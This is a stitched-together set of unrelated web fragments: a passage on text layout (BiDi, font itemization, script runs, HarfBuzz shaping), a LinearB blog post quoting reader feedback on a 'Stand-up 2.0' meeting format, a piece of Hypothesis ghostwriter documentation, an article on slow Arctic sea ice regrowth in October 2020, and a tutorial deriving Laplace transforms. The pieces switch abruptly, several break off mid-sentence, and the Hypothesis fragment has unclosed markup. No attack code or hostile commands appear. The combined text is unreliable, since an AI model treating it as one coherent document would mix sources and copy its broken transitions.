<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>

<h2><strong>I’m in awe (thank you)&nbsp;</strong></h2>



<p>Two weeks ago I posted a blog about reinventing our daily stand-up meeting:&nbsp;</p>



<p><a href="https://linearb.io/blog/daily-stand-up-2-0-its-time-to-ditch-the-stand-up-from-1993/" target="_blank" rel="noreferrer noopener"><strong>Stand-up 2.0: It’s time to ditch the daily from 1993</strong></a></p>



<p>We don’t need a meeting to discuss individual status updates that could be a Slack message.</p>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/quote_6-1024x283.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/quote_6-1024x283.png 1024w, https://linearb.io/wp-content/uploads/2020/06/quote_6-300x83.png 300w, https://linearb.io/wp-content/uploads/2020/06/quote_6-768x212.png 768w, https://linearb.io/wp-content/uploads/2020/06/quote_6-1536x425.png 1536w, https://linearb.io/wp-content/uploads/2020/06/quote_6.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Let’s create a meeting focused on working together as a team to deliver our iteration on time.&nbsp;</p>



<p>I proposed a new framework that can be summarized into 3 key points:</p>



<ol><li>The stand-up should give everyone in the room value every day. Especially developers. Not just team leaders.<br></li><li>Team members show up to their daily already familiar with what their teammates did yesterday and what they have open today – aided by a simple Slack message or a <a href="https://linearb.io/demo" target="_blank" rel="noreferrer noopener">data-driven dashboard.</a><br></li><li>Instead of status, the meeting focuses on three topics:<br>– How am I blocked?<br>– What’s distracting me from my #1 priority?<br>– Will we ship on time?&nbsp;</li></ol>







<p>At the end of the post, I asked for feedback. And I got it. An incredible amount of it.&nbsp;</p>



<p>So let me first say <strong>thank you</strong>. I’m humbled that 100+ of you took the time to respond, give honest feedback, and share your own ideas.</p>

<p>I’m working on two more posts right now. One about the guidelines and technology we need to make the Stand-up 2.0 framework work. Another documenting the experiments our own dev team has been running at <a href="https://linearb.io/" target="_blank" rel="noreferrer noopener">LinearB</a> to see what they like and don’t like.&nbsp;</p>



<p>But all of your ideas have helped us evolve our thinking. So I figured I better share the feedback I received so we can continue the discussion together as a community.&nbsp;</p>







<h2><strong>Our community is ready for change</strong></h2>

<p>One of the main goals of Stand-up 2.0 is to make the daily more dev-centric.&nbsp;</p>



<hr>



<p><em>“The standups I’ve been a part of were either a total joke or just management getting a status update.” </em></p>



<p>-Jason, Software Engineer&nbsp;</p>







<p>Jason is not the first engineer I’ve heard this from over the years. I do think this is a widely held belief across our community. But you’ll see below it’s not quite that simple.&nbsp;</p>



<p>More than 100 people responded through chat, Linkedin, text, and email. I attempted to filter the most thoughtful and interesting comments representing the spectrum from excited and supportive to critical and apathetic.&nbsp;</p>







<p><strong>The feedback below is organized into 10 themes</strong> that emerged as I was processing everything:</p>







<h3><strong>1) Not everyone agrees</strong></h3>



<p>One CTO I’m friends with straight up said it was a bad idea.&nbsp;</p>



<hr>



<p><strong><em>“</em></strong><em>Not so sure on this one, Dan. Getting everyone to prep ahead of time is tough.” </em></p>



<p>-Jill, CTO</p>







<p>A few people told me the stand-up is fine the way it is.&nbsp;</p>



<hr>



<p><em>“Personally I actually like standup as it gives me a memory boost to start my day. Yesterday I worked on ABC today I am working on XYZ.” </em></p>



<p><em>-Arash, London&nbsp;</em></p>







<h3><strong>2) But, it feels like we’re on to something big</strong></h3>



<p>I was overwhelmed by the amount of positive, passionate feedback. Thanks for the encouragement, Everyone! It feels like the desire to change has been bubbling in our community for a while and now the dam is close to bursting.&nbsp;</p>

<p><em>“I found your article and </em>🤯💡🤯💡🤯💡<em> I’m intrigued as heck and would love to learn more.” </em></p>



<p>-Danielle, Front End Developer&nbsp;</p>



<hr>



<p><em>“I found the article really interesting – the problems are well described from the perspective of each persona and some of them should be resolved by your updated framework. We are facing similar concerns in my current company and we are progressively addressing them.”</em> </p>



<p>-Julien, Software Engineering Manager&nbsp;</p>



<hr>



<p><em>“Dan, I love the blog about standups – you’re totally right. Why are we still asking about status updates? This makes no sense.” </em></p>



<p>-Robert, VP Software Development</p>



<hr>



<p><em>“Great idea, Dan! It’s not the stand-up itself, the way it is done needs to change.” </em></p>



<p>-Sandeep, Enterprise Transformation Leader&nbsp;</p>



<hr>



<p><em>“I read your article and really enjoyed it. Please continue your efforts to bring this to life.” </em></p>



<p>-Nadav, Full Stack Developer&nbsp;</p>

<p><em>“I’m inclined to agree with you. Especially the larger the standup, the more people sleepwalk through it.” </em></p>

<p><em>“When I read your stand-up piece… Dude, you almost made me cry.”</em> </p>



<p><em>-Harry, Scrum Master&nbsp;</em></p>







<p>Wow, Harry. I assume the crying is good?&nbsp;&nbsp;😭</p>



<p>It says a lot about our community that so many are open to such a high degree of change for a ceremony so embedded in our process. Continuous improvement is part of our agile mindset but that doesn’t mean change isn’t hard. When something works for a long time, it’s easy to get comfortable.&nbsp;</p>



<p>As one developer points out:&nbsp;</p>



<hr>



<p><em>“The theory behind agile/scrum is good but not perfect for everyone. It needs some updating. Frankly, the agile community looks like a bunch of asshats with how they argue so much.” </em></p>



<p>-Danielle, Front End Developer&nbsp;</p>







<p>You’ll get no argument from me, Danielle 🙂&nbsp;</p>



<p>Pain is the catalyst for change. And clearly here, we’ve struck a nerve.&nbsp;</p>

<h3><strong>3) Some teams are already post stand-up 1.0</strong></h3>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/quote_9-1024x365.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/quote_9-1024x365.png 1024w, https://linearb.io/wp-content/uploads/2020/06/quote_9-300x107.png 300w, https://linearb.io/wp-content/uploads/2020/06/quote_9-768x274.png 768w, https://linearb.io/wp-content/uploads/2020/06/quote_9-1536x548.png 1536w, https://linearb.io/wp-content/uploads/2020/06/quote_9.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<hr>



<p><em>“In a truly high performing team I’d replace standup altogether with a nice coffee and a croissant.” </em></p>



<p>-Pm_me_your_amphibian</p>



<hr>



<p><em>“We do weekly stand-ups and ad-hoc meetings when needed. And then we just share a Slack update at a designated time each morning.” </em></p>



<p>– Felix, VP Engineering&nbsp;</p>



<hr>



<p><em>“COVID forced us to type up our stand up into a chat group each morning. It was the best thing that could have happened. Now we have a written commitment from everyone and as the boss, I have an instant snapshot of what everyone is doing. The team is loving the extra time in their day.” </em></p>



<p>-Ganzibai, Dev Team Lead&nbsp;</p>



<hr>



<p><em>“I have a completely remote team (pre-covid). We use Jira, Slack, and Github. We’ve been doing weekly stand-ups and just use Slack to request an ad-hoc meeting if there is an impediment that arises before the standup.” </em></p>



<p>-Samwheat90</p>







<p>I’m fascinated by this! I had honestly never heard of scrum teams not holding a daily stand-up meeting.&nbsp;</p>



<p>I have a few takeaways from the comments above:</p>



<ul><li>The maturity of your team matters. If you’re forming, storming or norming, you probably need more mechanisms to talk to each other – like meetings. If your team is performing, I can see how eliminating the daily meeting (replaced by a detailed Slack message or some kind of dashboard) could work.<br></li><li>Whether you hold a meeting or not, writing down your commitment makes a lot of sense. It can organize everyone and increase accountability. Again, especially if your team is still learning to work with each other.<br></li><li>Should the daily stand-up meeting actually be weekly?&nbsp;</li></ul>







<h3><strong>4) Some people had a lot to say&nbsp;</strong></h3>



<p>I received several long emails. I couldn’t include all of them but thanks to everyone who took the time to share their thoughts in great detail.</p>



<figure><img src="https://linearb.io/wp-content/uploads/2020/06/quote_3-1024x386.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/06/quote_3-1024x386.png 1024w, https://linearb.io/wp-content/uploads/2020/06/quote_3-300x113.png 300w, https://linearb.io/wp-content/uploads/2020/06/quote_3-768x289.png 768w, https://linearb.io/wp-content/uploads/2020/06/quote_3-1536x578.png 1536w, https://linearb.io/wp-content/uploads/2020/06/quote_3.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<hr>



<p><em>“I wrote a response to your article online, then I realized it got a little long and the character limit is 600. I figured since I’d written it I’d email it to you directly.”</em> </p>



<p>-Ben, Program Manager&nbsp;</p>







<p>I’ll summarize Ben’s email for you:&nbsp;</p>



<p><strong>The stand-up is all about communication.</strong> <em>“It sprang from a recognition that developers are typically awful at communication and much prefer to silo themselves and deep dive into code or spin their wheels on a problem in silence instead of announcing when they’ve completed a feature someone else was waiting on or are looking to pick up their next piece of work.”</em></p>



<p><strong>The stand-up is not a status update.</strong><em> “The objective is to solve the inherent lack of communication between the team by providing a forum that allows whole one-off team broadcast instead of multiple singular point to point messages between team members that isolate everyone else.”</em></p>



<p><strong>It takes a lot of discipline to make stand-up 1.0 work.</strong> <em>“The examples you listed as problems are real issues, but they’re not process-based. You’re spending longer in your stand up because your ticketing system isn’t up to date, you feel you don’t know if you’re going to make the sprint goal, your product owners need to ask for updates – all of these can be generalized as a lack of communication coming from your developers.”</em>&nbsp;</p>



<p><strong>In summary… </strong>Ben is saying that if everyone did their job by updating Jira tickets, attending the meeting on time every day, staying within their allotted two minutes and openly communicating when they need help, we wouldn’t need to change the stand-up framework.&nbsp;</p>



<p>I don’t know Ben but I like to think of him as an optimist 🙂 He’s arguing for how it should be. He believes that people are capable of better communication and a higher level of accountability.&nbsp;</p>



<p>I believe this too. But I also accept that different people have different strengths. Not everyone is comfortable speaking up and asking for help. And the entire industry struggles with updating Jira. So, call me a realist, but I think we need to accept how it is and try to make it better.&nbsp;</p>



<p>More importantly, even in elite teams where there is a high level of communication and accountability, I still think we can still elevate the stand-up and use it as a forum to talk about things that are more central to delivering a high-quality iteration on time.&nbsp;</p>







<h3><strong>5) There were a lot of ideas for Stand-up 2.1</strong></h3>

<p>Writing tests with Hypothesis frees you from the tedium of deciding on and
writing out specific inputs to test.  Now, the <code><span>hypothesis.extra.ghostwriter</span></code>
module can write your test functions for you too!</p>
<p>The idea is to provide <strong>an easy way to start</strong> property-based testing,
<strong>and a seamless transition</strong> to more complex test code - because ghostwritten
tests are source code that you could have written for yourself.</p>
<p>So just pick a function you’d like tested, and feed it to one of the functions
below or <a data-doc="extras" data-docpath="/extras.html" data-project="hypothesis" data-section="hypothesis-cli" data-version="latest" href="https://hypothesis.readthedocs.io/en/latest/extras.html#hypothesis-cli"><span>our command-line interface</span></a> <strong>hypothesis write -h</strong>!
They follow imports, use but do not require type annotations, and generally
do their best to write you a useful test.</p>
<div>
<p>Note</p>
<p>The ghostwriter requires <a href="https://pypi.org/project/black">black</a>, but the generated code has no
dependencies beyond Hypothesis itself.</p>

<p>Note</p>
<p>Legal questions?  While the ghostwriter fragments and logic is under the
MPL-2.0 license like the rest of Hypothesis, the <em>output</em> from the ghostwriter
is made available under the <a href="https://creativecommons.org/share-your-work/public-domain/cc0/">Creative Commons Zero (CC0)</a>

Because the <code><span>pattern</span></code> parameter doesn’t have annotations or a default argument,
you’ll need to specify a strategy - for example <a data-doc="data" data-docpath="/data.html" data-project="hypothesis" data-section="hypothesis.strategies.text" data-version="latest" href="https://hypothesis.readthedocs.io/en/latest/data.html#hypothesis.strategies.text" title="hypothesis.strategies.text"><code><span>text()</span></code></a>

<p><strong>Arctic sea ice melt season usually lasts from March till September. After reaching the minimum extent in September, sea ice starts to grow back in October. But this year, the growth is much slower than last year, with almost no growth in some places. How did this unusual situation happen and can it mean something for the weather towards Winter 2020/2021?</strong><br>
&nbsp;</p>
<h5><span><strong>THE ARCTIC ICE GROWTH</strong></span></h5>
<p>The Arctic sea ice seasonal cycle can be seen in the image below from the Arctic-ROOS system. It shows the Arctic sea ice extent change over a year. The melt season usually starts in March, after the peak ice extent is reached, lasting all the way to September. The graph shows the last few years of data, where we can see the 2020 Arctic ice extent was second-lowest, only behind 2012, which still holds the record for the lowest ice extent since measurements began.</p>

<p>But comparing 2012 and 2020, we can see that this year we are also setting a new record, as the Arctic sea ice is not recovering as expected. The sea ice is refreezing back, but at a much slower rate than normal, meaning that some areas are severely falling behind.</p>

<p>That is even more evident when we look at the comparison of all the years since the active satellite observations began in 1979. This year we observed the second-lowest Arctic sea ice extent on record. But because of the unusually low ice growth in October, the current ice extent is now the lowest for any October in the past 41 years.</p>

<p>Comparing the minimum extent dates for the past 17 years also shows the 2020 minimum to be second lowest, trailing only the grand minimum of 2012. Graphic provided by <a href="https://sites.uci.edu/zlabe/graduate-research/">Zachary Labe</a>.</p>

<p>Comparing the years by the current date, we are well the lowest for this time of year. That is also evident by the second image, which shows the sea ice anomaly, compared to the long-term average. It shows the 2020 (red area) ice extent anomaly to continue to increase, while in the previous years (white lines), the anomaly already started to decrease by this point.</p>

<p>Growth has obviously begun since mid-September, but the rate was rather weak and is not increasing with time, evident by the recent daily increase rate on the image below. At this point, the daily growth should slowly increase over time, but we can see the daily growth area is not increasing and has rather been almost decreasing over time. The second image shows the October growth compared to previous years, where 2020 is severely trailing behind</p>

<p>Images below show the current sea ice extent and thickness. We can see that the thickness shows a larger area than the concentration. That is because the concentration shows only the sea ice above 15% concentration. Anything below that means the ice is just too fractured and not compact enough.</p>
<p>So the sea ice thickness image reveals that there is thinner uncompacted ice around the edges, which falls below the 15% concentration threshold. This is usually normal because new sea ice is just starting to form on the edges and takes time to get more compact. But this year the ice is not compacting so fast, and we are now going to look at what is behind this unusual event.</p>

<h5><span><strong>THE VAST ARCTIC OCEAN</strong></span></h5>
<p>The Arctic region is in fact entirely an ocean and has no large-scale landmass. It is the smallest and shallowest of the world’s five major oceans, and also the coldest. It is also the only ocean smaller than the largest country in the world by area, Russia.</p>
<p>The image below shows the Arctic ocean, as it would look without water, revealing a very complex underwater terrain. To understand the current unusual sea ice anomalies, we need to understand the ocean where all the ice floats on. More specifically, we need to understand the state of the ocean in its eastern region, in the Kara Sea, Siberian Sea, and the Laptev Sea. The image below shows these regions in the Arctic Ocean, found on the side opposite to Greenland. The graphic is from one of the more recent Arctic Ocean <a href="https://www.researchgate.net/publication/314163132_New_constraints_on_Arctic_Ocean_Mn_stratigraphy_from_radiocarbon_dating_on_planktonic_foraminifera">studies</a>.</p>

<p>The image below is probably the most important one so far, as it shows the ocean surface temperature anomaly. It shows the ocean temperatures are currently well above normal around the entire Arctic ice sheet. Anomalies of over 2-3 degrees Celsius can be found across all the 3 critical ocean regions we mentioned above.</p>

<p>Also looking at the raw temperatures, we can see the eastern Arctic ocean is actually in positive surface temperatures, which means a low to zero chance of freezing over at this point. In normal conditions, almost the entire Arctic ocean should be at or below the freezing point – 0°C (black color) by the end of October.</p>

<p>When comparing the current ice concentration and thickness with the lowest ice extent in mid-September, we can see the growth on the edges. But towards Siberia, we can actually see a reduced concentration and reduced thickness (red colors). Ocean and air temperatures were not yet right to allow rapid refreeze towards Siberia at present time.</p>

<p>But temperature is not the only factor here. <span><strong>Ocean salinity</strong></span> also plays a big role in the production of ice. The saltier the water, the colder it needs to get for ice to form. Think of salt being used on the roads to prevent ice buildup.</p>
<p>The image below shows the Arctic ocean salinity, where we can see the fresher water in blue colors, and saltier waters in brownish hues. Transport of saltier water is obvious from the North Atlantic into the Arctic Ocean, specifically towards the eastern parts. Interestingly, we can see the dark colors around the coastal areas, which is very fresh water. That is the freshwater discharge from the Siberian rivers.</p>

<p>We produced a short but very cool high-resolution video animation, which shows the Arctic ocean salinity in the past 5 months. You can see the <span><strong>ocean circulation</strong></span>, <strong><span>ocean currents,</span></strong> and the <strong><span>saltier water transport</span></strong> from the North Atlantic. Also note the freshwater entering the Arctic from the Siberian side, as the rivers discharge into the ocean, and note the freshwater increase during Summer, as melting ice makes the surface waters fresher.</p>


<h5><span><strong>SEA ICE ACROSS REGIONS</strong></span></h5>
<p>Many regions have regained ice since the lowest point in mid-September. But as we have shown above, the east Arctic Ocean is unusually warm and prevents fast sea-ice expansion.</p>
<p>The image below shows the sea ice extent by various regions across the Arctic. While some regions normally start the freezing at a later date, there are 3 regions that stand out, as they should be much higher than they currently are. The <strong><span>Siberian Sea</span></strong> region, the <span><strong>Kara Sea</strong></span>, and the <span><strong>Laptev Sea</strong></span>. These are the regions that we have highlighted higher up in the article, which also face the biggest temperature anomalies.</p>

<p>Looking at the Siberian Arctic region, it is struggling to increase the ice extent. It is running really unusually low for this time of year, having just a few % of the normal sea ice extent expected for this date.</p>

<p>And of course, the Laptev Sea, which has been at record low levels for quite some time now. In the previous decade, the Laptev Sea has been entirely frozen over by this time of year, while this year it simply cannot lift off the ground.</p>

<p>But what is causing this unusual situation in the eastern Arctic Ocean? We have seen the ocean temperature anomalies and ocean salinity. But what has brought the Arctic Ocean into this state? Part of the answer lies in the Atmosphere, which is where we are heading next.<br>
&nbsp;</p>
<h5><span><strong>FROM THE OCEAN TO THE ATMOSPHERE</strong></span></h5>
<p>In the atmosphere, we usually always start with the temperatures. Looking at the January-September period, we can see that a hotspot has developed right over Siberia and the eastern Arctic Ocean. We can see a large area of temperatures 4-5°C above the long term average. We wrote about these <a href="https://www.severe-weather.eu/global-weather/arctic-circle-high-pressure-warming-fa/">Arctic heatwaves</a>, which were ongoing since Spring.</p>

<p>A closer look at the August-September period reveals an even stronger hotspot, now expanded further into the Arctic Ocean, as the sea ice melted and more open water was exposed to the warmer weather.</p>

<p>The reason behind this anomaly was a very specific pressure pattern. The October analysis so far, shows the high-pressure area dominating the Arctic region, while we can see a low-pressure system over the Siberian side.</p>

<p>Such a pattern creates a very unique transpolar airflow over the eastern Arctic Ocean. The image below shows the average low-level wind flow in October so far. We can see the air transport across the Arctic, as warmer air enters the Arctic from one side, and cooler air leaving out on the other side.</p>

<p>The past 10 days specifically, have seen anomalies in excess of 15°C across the Siberian Arctic ocean. This, together with the warmer ocean waters, has been a large ice growth inhibitor so far in October.</p>

<p>The forecast is not looking any better. The pressure pattern has now actually reversed, with lower pressure over the Arctic. But this will change the airflow direction, just bringing warmer air from another source region. The first image shows the pressure anomalies next weekend. The second image shows the wind direction and temperature anomalies, revealing a large scale warmer air transport into the Siberian Arctic.</p>

Definition-wise, Laplace transform takes a function of real variable $f(t)$ (defined for all $t \ge 0$) to a function of complex variable $F(s)$ as follows:</p>\[\mathcal{L}\{f(t)\} = \int_0^{\infty} f(t) e^{-st} \, dt = F(s) \]<h2><span id="Some_Preliminary_Examples"></span><a href="#toc">Some Preliminary Examples</a><span></span></h2><p>What fate awaits <strong>simple functions</strong> as they enter the Laplace transform?</p><p>Take the simplest function: the <strong>constant function</strong> $f(t)=1$. In this case, putting $1$ in the transform yields $1/s$, which means that we went from a constant to a variable-dependent function.</p><iframe src="https://www.youtube.com/embed/OiNh2DswFt4?start=174" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p>(Odd but not too worrying. After all, we’ve seen $1/x$ integrating to $\ln x$ in calculus. Not a constant-to-variable situation of course, but an unexpected transformation nonetheless.)</p><p>Let us take it up a notch, with the <strong>linear function</strong> $f(t) = t$. After the transformation, it is turned into $1/s^2$, which means that we went from $1 \to 1/s$ to $t \to 1/s^2$. A pattern begins to emerge.</p><p>Now what about $f(t)=t^n$? With this simple <strong>power function</strong>, we end up with: \[ \mathcal{L}\{ t^n \} = \frac{n!}{s^{n+1}}\] So there was a factorial in $\mathcal{L}\{t\}$ all along, hidden by the fact that $1! = 1$. What else is the transform hiding?</p><p>Here, a glance at a table of <strong><a aria-label="common Laplace transforms (opens in a new tab)" rel="noreferrer noopener" href="https://tutorial.math.lamar.edu/pdf/Laplace_Table.pdf" target="_blank">common Laplace transforms</a></strong> would show that the emerging pattern cannot explain other functions easily. Things get weird, and the weirdness escalates quickly — which brings us back to the sine function.</p><h2><span id="Looking_Inside_the_Laplace_Transform_of_Sine"></span><a href="#toc">Looking Inside the Laplace Transform of Sine</a><span></span></h2><p>Let us unpack what happens to our sine function as we Laplace-transform it. We begin by noticing that a sine function can be expressed as a <strong>complex exponential</strong> — an indirect result of the celebrated <a href="https://mathvault.ca/euler-formula/" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Euler’s formula</a>:\[e^{it} = \cos t + i \sin t\]In fact, a sine is often expressed in terms of exponentials for <strong>ease of calculation</strong>, so if we apply that to the function $f(t) = \sin (at)$, we would get: \[ \sin(at) = \frac{e^{iat}-e^{-iat}}{2i} \]Thus the <strong>Laplace transform</strong> of $\sin(at)$ then becomes:<br>\[ \mathcal{L}\{\sin(at)\} = \frac{1}{2i} \int\limits_0^{\infty} (e^{iat}-e^{-iat}) e^{-st} \, dt \]which means that we have a <strong>product of exponentials</strong>. Distributing the terms, we get:<br>\[ \mathcal{L}\{\sin(at)\} = \frac{1}{2i} \int\limits_0^{\infty} e^{iat-st}-e^{-iat-st} \, dt \]</p><p>Here, <strong>factoring</strong> the $t$ in the exponents yields:<br>\[ \mathcal{L}\{\sin(at)\} = \frac{1}{2i} \int\limits_0^{\infty} e^{(ia-s)t}-e^{(-ia-s)t} \, dt \]and since $\mathrm{Re}(s) \gt 0$ by assumption, we can proceed with the integration from $0$ to $\infty$ as usual:<br>\[ \mathcal{L}\{\sin(at)\} = \left.\frac{e^{(ia-s)t}}{2i (ia-s)}\right|_0^{\infty}-\left.\frac{e^{(-ia-s)t}}{2i (-ia-s)}\right|_0^{\infty} \]</p><p>Let us simplify further. <strong>Distributing</strong> the $i$ inside the parentheses, we get:<br>\[ \mathcal{L}\{\sin(at)\} = \left.\frac{e^{(ia-s)t}}{2(-a-is)}\right|_0^{\infty}-\left.\frac{e^{(-ia-s)t}}{2(a-is)}\right|_0^{\infty} \]By evaluating the $t$ at the <strong>boundaries</strong>, we get:<br>\[ \mathcal{L}\{\sin(at)\} = \left( \frac{e^{(ia-s) \cdot \infty}}{2(-a-is)}-\frac{e^{(ia-s) \cdot 0}}{2 (-a-is)}\right)-\left(\frac{e^{(-ia-s)\cdot\infty}}{2(a-is)}-\frac{e^{(-ia-s)\cdot 0}}{2(a-is)}\right) \]And because $\mathrm{Re}(s) &gt; 0$ by assumption, both $e^{(ia-s) \cdot \infty}$ and $e^{(-ia-s)\cdot\infty}$ oscillate to $0$ (i.e., <strong><a aria-label="vanish at infinity (opens in a new tab)" rel="noreferrer noopener" href="https://mathvault.ca/math-glossary/#vanish" target="_blank">vanish at infinity</a></strong>), after which we are then left with:\[ \mathcal{L}\{\sin(at)\} = \frac{1}{-2(-a-is)} + \frac{1}{2(a-is)} \]Once there, merging the <strong>fractions</strong> together would yield:\begin{align*} \mathcal{L}\{\sin(at)\} &amp; = \frac{2(a-is)-2(-a-is)}{-4 (a-is)(-a-is)} \\ &amp; = \frac{2a-2is + 2a+2is}{4 (a^2 + isa-isa + s^2)} \\ &amp; = \frac{4a}{4(a^2 + s^2)} \\ &amp; = \frac{a}{a^2 + s^2} \end{align*}which shows that after Laplace transform, a sine is turned into a more tractable <strong>geometric function</strong>. By following similar reasoning, the Laplace transform of cosine can be shown to be equal to the following expression as well: \[ \mathcal{L}\{\cos (at)\} = \frac{s}{a^2 + s^2} \qquad (\mathrm{Re}(s) &gt; 0) \] But then, one might argue “Why do we need to transform trigonometric functions like this when we can just <strong>integrate</strong> them?”</p><h2><span id="Diverging_Functions_What_the_Laplace_Transform_is_for"></span><a href="#toc">Diverging Functions: What the Laplace Transform is for</a><span></span></h2><p>What if we throw a wrench in there by introducing a <strong>diverging function</strong>, say, $f(t)=e^{at}$? As it turns out, the Laplace transform of the exponential $e^{at}$ is actually deceptively simple: \begin{align*} \mathcal{L}\{e^{at}\} &amp; = \int_0^{\infty} e^{at}e^{-st} \, dt \\ &amp; = \int_0^{\infty} e^{(a-s)t} \, dt \end{align*}Here, we see that so long as $\mathrm{Re}(s) \gt a$, we would get that: \begin{align*} \int_0^{\infty} e^{(a-s)t} \, dt &amp; = \left. \frac{e^{(a-s)t}}{a-s} \right|_0^{\infty} \\ &amp; = 0-\frac{1}{a-s}  \\ &amp; = \frac{1}{s-a} \end{align*} That is, as long as $\mathrm{Re}(s) &gt; a$, the Laplace transform of $e^{at}$ is a simple $1/(s-a)$. Here’s a <strong>video version</strong> of the derivation for the record.</p><iframe src="https://www.youtube.com/embed/33TYoybjqPg?start=50" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p>On the other hand, if we mix the exponential $e^{at}$ with the <strong>power function</strong> $t^n$, we would then have: \[ \mathcal{L}\{t^n e^{at}\} = \int\limits_0^{\infty} t^n e^{at} e^{-st} \, dt \] which, after a bit of <a aria-label="recursion (opens in a new tab)" 